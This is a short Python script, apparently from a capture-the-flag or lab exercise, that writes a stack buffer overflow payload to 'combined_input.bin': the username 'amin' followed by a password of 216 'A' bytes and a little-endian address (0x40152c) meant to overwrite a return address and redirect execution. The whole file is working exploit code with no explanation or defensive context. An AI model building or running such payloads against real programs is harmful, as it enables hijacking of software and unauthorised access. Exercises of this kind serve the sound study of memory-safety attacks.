username = b"amin\n"
password = b"A" * 216 + b"\x2c\x15\x40\x00\x00\x00\x00\x00\n"

with open("combined_input.bin", "wb") as f:
    f.write(username + password)
